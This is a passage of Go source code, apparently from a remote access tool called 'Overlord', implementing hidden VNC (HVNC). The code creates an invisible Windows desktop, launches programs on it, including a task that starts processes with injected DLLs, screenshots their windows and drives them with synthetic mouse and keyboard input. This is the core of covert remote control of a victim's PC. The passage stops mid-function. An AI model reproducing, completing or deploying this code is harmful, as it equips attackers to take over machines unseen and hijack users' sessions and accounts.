//go:build windows

package capture

import (
	"fmt"
	"image"
	"log"
	"math"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	procCreateDesktopW           = user32.NewProc("CreateDesktopW")
	procOpenDesktopW             = user32.NewProc("OpenDesktopW")
	procCloseDesktop             = user32.NewProc("CloseDesktop")
	procSetThreadDesktop         = user32.NewProc("SetThreadDesktop")
	procGetThreadDesktop         = user32.NewProc("GetThreadDesktop")
	procSwitchDesktop            = user32.NewProc("SwitchDesktop")
	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
	procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
	procGetWindowRect            = user32.NewProc("GetWindowRect")
	procIsWindowVisible          = user32.NewProc("IsWindowVisible")
	procPrintWindow              = user32.NewProc("PrintWindow")
	procGetWindow                = user32.NewProc("GetWindow")
	procGetTopWindow             = user32.NewProc("GetTopWindow")
	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
	procSendInputHVNC            = user32.NewProc("SendInput")
	procGetCursorPosHVNC         = user32.NewProc("GetCursorPos")
	procWindowFromPoint          = user32.NewProc("WindowFromPoint")
	procScreenToClient           = user32.NewProc("ScreenToClient")
	procPostMessageW             = user32.NewProc("PostMessageW")
	procSendMessageTimeoutW      = user32.NewProc("SendMessageTimeoutW")
	procSetWindowPos             = user32.NewProc("SetWindowPos")
	procSetForegroundWindow      = user32.NewProc("SetForegroundWindow")
	procSetActiveWindow          = user32.NewProc("SetActiveWindow")
	procSetFocus                 = user32.NewProc("SetFocus")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetAncestor              = user32.NewProc("GetAncestor")
	procMapVirtualKeyW           = user32.NewProc("MapVirtualKeyW")
	procToUnicode                = user32.NewProc("ToUnicode")
	procGetWindowPlacement       = user32.NewProc("GetWindowPlacement")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
)

const (
	DESKTOP_READOBJECTS     = 0x0001
	DESKTOP_CREATEWINDOW    = 0x0002
	DESKTOP_CREATEMENU      = 0x0004
	DESKTOP_HOOKCONTROL     = 0x0008
	DESKTOP_JOURNALRECORD   = 0x0010
	DESKTOP_JOURNALPLAYBACK = 0x0020
	DESKTOP_ENUMERATE       = 0x0040
	DESKTOP_WRITEOBJECTS    = 0x0080
	DESKTOP_SWITCHDESKTOP   = 0x0100

	GENERIC_ALL = 0x10000000

	DESKTOP_ALL_ACCESS = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
		DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD |
		DESKTOP_JOURNALPLAYBACK | DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_ALL

	GW_HWNDFIRST         = 0
	GW_HWNDLAST          = 1
	GW_HWNDNEXT          = 2
	GW_HWNDPREV          = 3
	PW_RENDERFULLCONTENT = 0x00000002

	STARTF_USEPOSITION     = 0x00000004
	CREATE_NEW_CONSOLE     = 0x00000010
	MOUSEEVENTF_MOVE       = 0x0001
	MOUSEEVENTF_LEFTDOWN   = 0x0002
	MOUSEEVENTF_LEFTUP     = 0x0004
	MOUSEEVENTF_RIGHTDOWN  = 0x0008
	MOUSEEVENTF_RIGHTUP    = 0x0010
	MOUSEEVENTF_MIDDLEDOWN = 0x0020
	MOUSEEVENTF_MIDDLEUP   = 0x0040
	MOUSEEVENTF_WHEEL      = 0x0800
	MOUSEEVENTF_ABSOLUTE   = 0x8000
	INPUT_MOUSE            = 0
	INPUT_KEYBOARD         = 1
	KEYEVENTF_KEYUP        = 0x0002
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_CAPITAL             = 0x14
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	WM_MOUSEMOVE           = 0x0200
	WM_LBUTTONDOWN         = 0x0201
	WM_LBUTTONUP           = 0x0202
	WM_RBUTTONDOWN         = 0x0204
	WM_RBUTTONUP           = 0x0205
	WM_MBUTTONDOWN         = 0x0207
	WM_MBUTTONUP           = 0x0208
	WM_NCHITTEST           = 0x0084
	WM_NCLBUTTONDOWN       = 0x00A1
	WM_NCLBUTTONUP         = 0x00A2
	WM_CLOSE               = 0x0010
	WM_DESTROY             = 0x0002
	WM_SYSCOMMAND          = 0x0112
	WM_KEYDOWN             = 0x0100
	WM_KEYUP               = 0x0101
	WM_CHAR                = 0x0102
	WM_MOUSEWHEEL          = 0x020A
	MK_LBUTTON             = 0x0001
	MK_RBUTTON             = 0x0002
	MK_MBUTTON             = 0x0010
	WHEEL_DELTA            = 120
	HTCAPTION              = 2
	HTCLIENT               = 1
	HTCLOSE                = 20
	HTMINBUTTON            = 8
	HTMAXBUTTON            = 9
	HTLEFT                 = 10
	HTRIGHT                = 11
	HTTOP                  = 12
	HTTOPLEFT              = 13
	HTTOPRIGHT             = 14
	HTBOTTOM               = 15
	HTBOTTOMLEFT           = 16
	HTBOTTOMRIGHT          = 17
	SC_MINIMIZE            = 0xF020
	SC_MAXIMIZE            = 0xF030
	SC_RESTORE             = 0xF120
	SW_SHOWMAXIMIZED       = 3
	GA_ROOT                = 2
	SMTO_ABORTIFHUNG       = 0x0002
)

var (
	hvncDesktopHandle   uintptr
	hvncDesktopMu       sync.Mutex
	hvncDesktopName     = "OverlordHiddenDesktop"
	hvncInitialized     bool
	hvncOriginalDesktop uintptr
	hvncCursorEnabled   bool
	hvncThreadOnce      sync.Once
	hvncThreadErr       error
	hvncThreadReady     chan struct{}
	hvncThreadTasks     chan hvncTask
	hvncWatchdogOnce    sync.Once
	hvncNoWindowLogNs   atomic.Int64
	hvncInputMu         sync.Mutex
	hvncLastCursor      point
	hvncHasCursor       bool
	hvncWorkingWindow   uintptr
	hvncShiftDown       bool
	hvncCtrlDown        bool
	hvncAltDown         bool
	hvncCapsLock        bool
	hvncMovingWindow    bool
	hvncMoveOffset      point
	hvncWindowSize      point
	hvncWindowToMove    uintptr
	hvncMouseButtons    uint32
	hvncPendingActivate uintptr
	hvncExplorerStarted bool
	hvncTaskSeq         atomic.Uint64
	hvncCurrentTaskID   atomic.Uint64
	hvncCurrentTaskKind atomic.Int64
	hvncCurrentTaskNs   atomic.Int64
	hvncLastScale       atomic.Uint64 // float64 bits — scale used by last HVNC capture

	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
	hvncWinCache     map[uintptr]*hvncWinCacheEntry
	hvncWinCachePrev []byte

	hvncCompHdcMem uintptr
	hvncCompHbmp   uintptr
	hvncCompBits   unsafe.Pointer
	hvncCompW      int
	hvncCompH      int

	hvncPendingMouseMove *hvncTask
	hvncPendingMoveMu    sync.Mutex
)

type hvncTaskKind int

const (
	hvncTaskCapture hvncTaskKind = iota
	hvncTaskStartProcess
	hvncTaskStartProcessInjected
	hvncTaskMouseMove
	hvncTaskMouseDown
	hvncTaskMouseUp
	hvncTaskKeyDown
	hvncTaskKeyUp
	hvncTaskMouseWheel
	hvncTaskAutoStartExplorer
)

type hvncTask struct {
	kind            hvncTaskKind
	id              uint64
	display         int
	filePath        string
	x               int32
	y               int32
	button          int
	vk              uint16
	delta           int32
	dllBytes        []byte
	captureDllBytes []byte
	searchPath      string
	replacePath     string
	queuedAt        time.Time
	resp            chan hvncTaskResult
}

type hvncTaskResult struct {
	img *image.RGBA
	err error
}

type startupInfo struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdErr         uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessId uint32
	dwThreadId  uint32
}

type mouseInput struct {
	dx          int32
	dy          int32
	mouseData   uint32
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type hvncWinCacheEntry struct {
	hdcMem uintptr
	hbmp   uintptr
	bits   unsafe.Pointer
	w, h   int
	lastOK bool
	age    int
}

type keybdInput struct {
	wVk         uint16
	wScan       uint16
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type input struct {
	inputType uint32
	union     [24]byte
}

func getCurrentThreadId() uint32 {
	r, _, _ := procGetCurrentThreadId.Call()
	return uint32(r)
}

func getThreadDesktop(threadId uint32) uintptr {
	r, _, _ := procGetThreadDesktop.Call(uintptr(threadId))
	return r
}

func isWindowVisible(hwnd uintptr) bool {
	r, _, _ := procIsWindowVisible.Call(hwnd)
	return r != 0
}

func printWindow(hwnd, hdc uintptr, flags uint32) bool {
	r, _, _ := procPrintWindow.Call(hwnd, hdc, uintptr(flags))
	return r != 0
}

func getWindow(hwnd uintptr, cmd uint32) uintptr {
	r, _, _ := procGetWindow.Call(hwnd, uintptr(cmd))
	return r
}

func getTopWindow(hwnd uintptr) uintptr {
	r, _, _ := procGetTopWindow.Call(hwnd)
	return r
}

func InitializeHVNCDesktop() error {
	hvncDesktopMu.Lock()
	defer hvncDesktopMu.Unlock()

	if hvncInitialized && hvncDesktopHandle != 0 {
		return nil
	}

	threadId := getCurrentThreadId()
	hvncOriginalDesktop = getThreadDesktop(threadId)

	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return fmt.Errorf("failed to convert desktop name: %v", err)
	}

	r, _, _ := procOpenDesktopW.Call(
		uintptr(unsafe.Pointer(desktopNamePtr)),
		0,
		0,
		uintptr(DESKTOP_ALL_ACCESS),
	)

	if r == 0 {
		r, _, err = procCreateDesktopW.Call(
			uintptr(unsafe.Pointer(desktopNamePtr)),
			0,
			0,
			0,
			uintptr(DESKTOP_ALL_ACCESS),
			0,
		)

		if r == 0 {
			return fmt.Errorf("failed to create hidden desktop: %v", err)
		}
	}

	hvncDesktopHandle = r
	hvncInitialized = true
	return nil
}

func CleanupHVNCDesktop() {
	hvncDesktopMu.Lock()
	defer hvncDesktopMu.Unlock()

	hvncCleanupFrameReaders()

	hvncFreeCapCache()

	for _, entry := range hvncWinCache {
		hvncFreeCacheEntry(entry)
	}
	hvncWinCache = nil
	hvncWinCachePrev = nil

	if hvncCompHbmp != 0 {
		deleteObject(hvncCompHbmp)
		hvncCompHbmp = 0
	}
	if hvncCompHdcMem != 0 {
		deleteDC(hvncCompHdcMem)
		hvncCompHdcMem = 0
	}
	hvncCompBits = nil
	hvncCompW = 0
	hvncCompH = 0

	hvncInputMu.Lock()
	hvncShiftDown = false
	hvncCtrlDown = false
	hvncAltDown = false
	hvncCapsLock = false
	hvncMouseButtons = 0
	hvncHasCursor = false
	hvncWorkingWindow = 0
	hvncInputMu.Unlock()
	hvncLastScale.Store(0)

	if hvncDesktopHandle != 0 {
		if hvncOriginalDesktop != 0 {
			procSetThreadDesktop.Call(hvncOriginalDesktop)
		}

		procCloseDesktop.Call(hvncDesktopHandle)
		hvncDesktopHandle = 0
	}
	hvncInitialized = false
	hvncExplorerStarted = false
	if hvncThreadTasks != nil {
		close(hvncThreadTasks)
		hvncThreadTasks = nil
	}
	hvncThreadReady = nil
	hvncThreadErr = nil
	hvncThreadOnce = sync.Once{}
	hvncWatchdogOnce = sync.Once{}
}

func SetHVNCCursorCapture(enabled bool) {
	hvncCursorEnabled = enabled
}

func hvncDesktopBounds() (image.Rectangle, bool) {
	hwnd, _, _ := procGetDesktopWindow.Call()
	if hwnd == 0 {
		return image.Rectangle{}, false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return image.Rectangle{}, false
	}
	if r.right <= r.left || r.bottom <= r.top {
		return image.Rectangle{}, false
	}
	return image.Rect(int(r.left), int(r.top), int(r.right), int(r.bottom)), true
}

func ensureHVNCThread() error {
	hvncDesktopMu.Lock()
	desktopHandle := hvncDesktopHandle
	hvncDesktopMu.Unlock()

	if desktopHandle == 0 {
		return fmt.Errorf("hvnc desktop not initialized")
	}

	hvncThreadOnce.Do(func() {
		hvncThreadReady = make(chan struct{})
		hvncThreadTasks = make(chan hvncTask)
		hvncWatchdogOnce.Do(func() {
			go hvncThreadWatchdog()
		})
		go func(handle uintptr) {
			defer recoverAndLog("hvnc desktop thread", nil)
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			r, _, err := procSetThreadDesktop.Call(handle)
			if r == 0 {
				hvncThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
				close(hvncThreadReady)
				for task := range hvncThreadTasks {
					task.resp <- hvncTaskResult{nil, hvncThreadErr}
				}
				return
			}

			close(hvncThreadReady)
			for task := range hvncThreadTasks {
				start := time.Now()
				hvncCurrentTaskID.Store(task.id)
				hvncCurrentTaskKind.Store(int64(task.kind))
				hvncCurrentTaskNs.Store(start.UnixNano())

				if shouldTraceHVNCTask(task.kind) {
					log.Printf("hvnc task: start id=%d kind=%s queued=%s details=%s", task.id, hvncTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), hvncTaskDetails(task))
				}

				var result hvncTaskResult
				switch task.kind {
				case hvncTaskStartProcess:
					result.err = startHVNCProcessOnThread(task.filePath)
				case hvncTaskStartProcessInjected:
					result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
				case hvncTaskMouseMove:
					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
				case hvncTaskMouseDown:
					result.err = hvncMouseButtonOnThread(task.button, true)
				case hvncTaskMouseUp:
					result.err = hvncMouseButtonOnThread(task.button, false)
				case hvncTaskKeyDown:
					result.err = hvncKeyOnThread(task.vk, true)
				case hvncTaskKeyUp:
					result.err = hvncKeyOnThread(task.vk, false)
				case hvncTaskMouseWheel:
					result.err = hvncMouseWheelOnThread(task.delta)
				case hvncTaskAutoStartExplorer:
					result.err = hvncAutoStartExplorerOnThread()
				default:
					result.img, result.err = hvncCaptureDisplayOnThread(task.display)
				}

				dur := time.Since(start)
				if shouldTraceHVNCTask(task.kind) || dur > 400*time.Millisecond {
					if result.err != nil {
						log.Printf("hvnc task: done id=%d kind=%s dur=%s err=%v", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
					} else {
						log.Printf("hvnc task: done id=%d kind=%s dur=%s", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond))
					}
				}

				hvncCurrentTaskNs.Store(0)
				hvncCurrentTaskKind.Store(-1)
				hvncCurrentTaskID.Store(0)
				task.resp <- result
			}
		}(desktopHandle)
	})

	if hvncThreadReady != nil {
		<-hvncThreadReady
	}

	return hvncThreadErr
}

func hvncCaptureDisplay(display int) (*image.RGBA, error) {
	if err := ensureHVNCThread(); err != nil {
		return nil, err
	}

	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskCapture, display: display, resp: resp}
	result := <-resp
	return result.img, result.err
}

func StartHVNCProcess(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	result, err := executeHVNCTask(hvncTask{
		kind:     hvncTaskStartProcess,
		filePath: strings.TrimSpace(filePath),
	}, 10*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCAutoStartExplorer() error {
	if hvncExplorerStarted {
		return nil
	}
	result, err := executeHVNCTask(hvncTask{
		kind: hvncTaskAutoStartExplorer,
	}, 15*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputMouseMove(display int, x, y int32) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputMouseDown(button int) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseDown, button: button}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputMouseUp(button int) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseUp, button: button}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputKeyDown(vk uint16) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyDown, vk: vk}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputKeyUp(vk uint16) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyUp, vk: vk}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func HVNCInputMouseWheel(delta int32) error {
	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseWheel, delta: delta}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func executeHVNCTask(task hvncTask, timeout time.Duration) (hvncTaskResult, error) {
	if err := ensureHVNCThread(); err != nil {
		return hvncTaskResult{}, err
	}
	if hvncThreadTasks == nil {
		return hvncTaskResult{}, fmt.Errorf("hvnc thread not available")
	}
	if timeout <= 0 {
		timeout = 3 * time.Second
	}

	task.resp = make(chan hvncTaskResult, 1)
	task.id = hvncTaskSeq.Add(1)
	task.queuedAt = time.Now()
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case hvncThreadTasks <- task:
	case <-timer.C:
		log.Printf("hvnc input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
		return hvncTaskResult{}, fmt.Errorf("hvnc task queue timed out")
	}

	select {
	case result := <-task.resp:
		return result, nil
	case <-timer.C:
		log.Printf("hvnc input: task execution timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
		return hvncTaskResult{}, fmt.Errorf("hvnc task execution timed out")
	}
}

func hvncThreadWatchdog() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		id := hvncCurrentTaskID.Load()
		if id == 0 {
			continue
		}
		startNs := hvncCurrentTaskNs.Load()
		if startNs == 0 {
			continue
		}
		running := time.Since(time.Unix(0, startNs))
		if running >= 2*time.Second {
			kind := hvncTaskKindName(hvncTaskKind(hvncCurrentTaskKind.Load()))
			log.Printf("hvnc watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
		}
	}
}

func shouldTraceHVNCTask(kind hvncTaskKind) bool {
	switch kind {
	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess, hvncTaskStartProcessInjected, hvncTaskAutoStartExplorer:
		return true
	default:
		return false
	}
}

func hvncTaskKindName(kind hvncTaskKind) string {
	switch kind {
	case hvncTaskCapture:
		return "capture"
	case hvncTaskStartProcess:
		return "start_process"
	case hvncTaskStartProcessInjected:
		return "start_process_injected"
	case hvncTaskMouseMove:
		return "mouse_move"
	case hvncTaskMouseDown:
		return "mouse_down"
	case hvncTaskMouseUp:
		return "mouse_up"
	case hvncTaskKeyDown:
		return "key_down"
	case hvncTaskKeyUp:
		return "key_up"
	case hvncTaskMouseWheel:
		return "mouse_wheel"
	case hvncTaskAutoStartExplorer:
		return "auto_start_explorer"
	default:
		return fmt.Sprintf("unknown(%d)", kind)
	}
}

func hvncTaskDetails(task hvncTask) string {
	switch task.kind {
	case hvncTaskMouseDown, hvncTaskMouseUp:
		return fmt.Sprintf("button=%d", task.button)
	case hvncTaskKeyDown, hvncTaskKeyUp:
		return fmt.Sprintf("vk=%d", task.vk)
	case hvncTaskMouseWheel:
		return fmt.Sprintf("delta=%d", task.delta)
	case hvncTaskStartProcess:
		return fmt.Sprintf("cmd=%q", task.filePath)
	case hvncTaskStartProcessInjected:
		return fmt.Sprintf("cmd=%q search=%q replace=%q dllSize=%d", task.filePath, task.searchPath, task.replacePath, len(task.dllBytes))
	default:
		return ""
	}
}

var (
	hvncCapHDCScreen uintptr
	hvncCapHDCMem    uintptr
	hvncCapHBMP      uintptr
	hvncCapBits      unsafe.Pointer
	hvncCapW         int
	hvncCapH         int
	hvncCapImg       *image.RGBA
)

func hvncFreeCapCache() {
	if hvncCapHBMP != 0 {
		deleteObject(hvncCapHBMP)
		hvncCapHBMP = 0
	}
	if hvncCapHDCMem != 0 {
		deleteDC(hvncCapHDCMem)
		hvncCapHDCMem = 0
	}
	if hvncCapHDCScreen != 0 {
		releaseDC(0, hvncCapHDCScreen)
		hvncCapHDCScreen = 0
	}
	hvncCapBits = nil
	hvncCapW = 0
	hvncCapH = 0
	hvncCapImg = nil
}

func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
	if hvncCapHDCScreen == 0 {
		hvncCapHDCScreen = getDC(0)
		if hvncCapHDCScreen == 0 {
			return 0, 0, nil, false
		}
	}
	if hvncCapHDCMem != 0 && hvncCapW == w && hvncCapH == h && hvncCapBits != nil {
		buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
		return hvncCapHDCScreen, hvncCapHDCMem, buf, true
	}
	if hvncCapHBMP != 0 {
		deleteObject(hvncCapHBMP)
		hvncCapHBMP = 0
	}
	if hvncCapHDCMem != 0 {
		deleteDC(hvncCapHDCMem)
		hvncCapHDCMem = 0
	}
	hvncCapHDCMem = createCompatibleDC(hvncCapHDCScreen)
	if hvncCapHDCMem == 0 {
		return 0, 0, nil, false
	}
	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(w),
			biHeight:      -int32(h),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	hvncCapHBMP = createDIBSection(hvncCapHDCMem, &bmi, DIB_RGB_COLORS, &hvncCapBits)
	if hvncCapHBMP == 0 || hvncCapBits == nil {
		deleteDC(hvncCapHDCMem)
		hvncCapHDCMem = 0
		return 0, 0, nil, false
	}
	selectObject(hvncCapHDCMem, hvncCapHBMP)
	hvncCapW = w
	hvncCapH = h
	hvncCapImg = nil
	buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
	return hvncCapHDCScreen, hvncCapHDCMem, buf, true
}

func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
	captureMu.Lock()
	defer captureMu.Unlock()

	setDPIAware()

	maxDisplays := displayCount()
	if maxDisplays <= 0 {
		maxDisplays = 1
	}
	if display < 0 || display >= maxDisplays {
		log.Printf("hvnc capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
		display = 0
	}

	bounds, boundsSource := hvncResolveCaptureBounds(display)
	srcW := bounds.Dx()
	srcH := bounds.Dy()
	if srcW <= 0 || srcH <= 0 {
		log.Printf("hvnc capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		return nil, syscall.EINVAL
	}

	userScale := effectiveScale(srcW, srcH)
	hvncLastScale.Store(math.Float64bits(userScale))
	dstW := int(float64(srcW) * userScale)
	dstH := int(float64(srcH) * userScale)
	if dstW <= 0 || dstH <= 0 {
		dstW = srcW
		dstH = srcH
	}

	capW := srcW
	capH := srcH

	hdcScreen, hdcMem, buf, ok := hvncEnsureCapCache(capW, capH)
	if !ok {
		return nil, syscall.EINVAL
	}

	for i := range buf {
		buf[i] = 0
	}

	drawn := drawHVNCWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
	if drawn == 0 {
		now := time.Now().UnixNano()
		last := hvncNoWindowLogNs.Load()
		if now-last > int64(5*time.Second) && hvncNoWindowLogNs.CompareAndSwap(last, now) {
			log.Printf("hvnc capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		}
	}

	swapRB(buf)

	img := hvncCapImg
	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
		hvncCapImg = img
	}
	copy(img.Pix, buf)

	_ = hdcMem

	if dstW != capW || dstH != capH {
		img = resizeNearest(img, dstW, dstH)
	}

	return img, nil
}

func startHVNCProcessOnThread(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}

	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return fmt.Errorf("failed to convert desktop name: %v", err)
	}
	cmdLine, err := syscall.UTF16FromString(filePath)
	if err != nil {
		return fmt.Errorf("failed to convert command line: %v", err)
	}
	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.lpDesktop = desktopNamePtr
	si.dwX = 0
	si.dwY = 0
	si.dwFlags = STARTF_USEPOSITION

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		uintptr(CREATE_NEW_CONSOLE),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return fmt.Errorf("CreateProcess failed: %v", callErr)
		}
		return fmt.Errorf("CreateProcess failed")
	}
	return nil
}

func hvncAutoStartExplorerOnThread() error {
	if hvncExplorerStarted {
		return nil
	}

	if isExplorerRunningToolhelp() {
		log.Printf("hvnc: explorer.exe already running on HVNC desktop, skipping auto-start")
		hvncExplorerStarted = true
		return nil
	}

	log.Printf("hvnc: no explorer.exe found on HVNC desktop, starting explorer.exe")
	err := startHVNCProcessOnThread("explorer.exe")
	if err != nil {
		return fmt.Errorf("auto-start explorer failed: %w", err)
	}
	hvncExplorerStarted = true
	return nil
}

func isExplorerPID(pid uint32) bool {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	hProc, _, _ := kernel32.NewProc("OpenProcess").Call(
		PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid),
	)
	if hProc == 0 {
		return false
	}
	defer procCloseHandle.Call(hProc)

	var buf [260]uint16
	size := uint32(len(buf))
	ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
		hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return false
	}
	name := strings.ToLower(syscall.UTF16ToString(buf[:size]))
	return strings.HasSuffix(name, `\explorer.exe`)
}

func isExplorerRunningToolhelp() bool {
	const TH32CS_SNAPPROCESS = 0x00000002
	snap, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return false
	}
	defer procCloseHandle.Call(snap)

	type processEntry32 struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		name := strings.ToLower(syscall.UTF16ToString(pe.szExeFile[:]))
		if name == "explorer.exe" {
			return true
		}
		pe.dwSize = uint32(unsafe.Sizeof(pe))
		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return false
}

func hvncMouseMoveOnThread(display int, x, y int32) error {
	bounds, _ := hvncResolveCaptureBounds(display)
	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		hvncInputMu.Lock()
		hvncLastCursor = point{x: x, y: y}
		hvncHasCursor = true
		hvncInputMu.Unlock()
		return nil
	}

	if bits := hvncLastScale.Load(); bits != 0 {
		if s := math.Float64frombits(bits); s > 0 && s < 1 {
			x = int32(float64(x) / s)
			y = int32(float64(y) / s)
		}
	}

	absX := bounds.Min.X + int(x)
	absY := bounds.Min.Y + int(y)
	if absX < bounds.Min.X {
		absX = bounds.Min.X
	}
	if absY < bounds.Min.Y {
		absY = bounds.Min.Y
	}
	if absX >= bounds.Max.X {
		absX = bounds.Max.X - 1
	}
	if absY >= bounds.Max.Y {
		absY = bounds.Max.Y - 1
	}

	hvncInputMu.Lock()
	hvncLastCursor = point{x: int32(absX), y: int32(absY)}
	hvncHasCursor = true
	hvncInputMu.Unlock()
	moveHVNCWindowIfDragging(point{x: int32(absX), y: int32(absY)})

	pt := point{x: int32(absX), y: int32(absY)}
	hitHwnd := windowFromPoint(pt)
	if hitHwnd != 0 {
		root := rootWindow(hitHwnd)
		prevWorking := getWorkingWindow()
		rememberWorkingWindow(hitHwnd)
		prevRoot := rootWindow(prevWorking)
		if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
			procSetForegroundWindow.Call(root)
			procSetActiveWindow.Call(root)
			procSetFocus.Call(hitHwnd)
		}
		clientPt := pt
		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
	}
	return nil
}

func hvncMouseButtonOnThread(button int, down bool) error {
	pt := currentHVNCCursor()

	if button == 0 && !down {
		endHVNCWindowDrag(pt)
	}

	setMouseButton(button, down)

	hitHwnd := windowFromPoint(pt)
	if hitHwnd == 0 {
		return nil
	}

	root := rootWindow(hitHwnd)
	prevWorking := getWorkingWindow()
	rememberWorkingWindow(hitHwnd)

	prevRoot := rootWindow(prevWorking)
	if down && (prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root))) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hitHwnd)
	}

	if button == 0 {
		lparam := makeLParam(pt.x, pt.y)
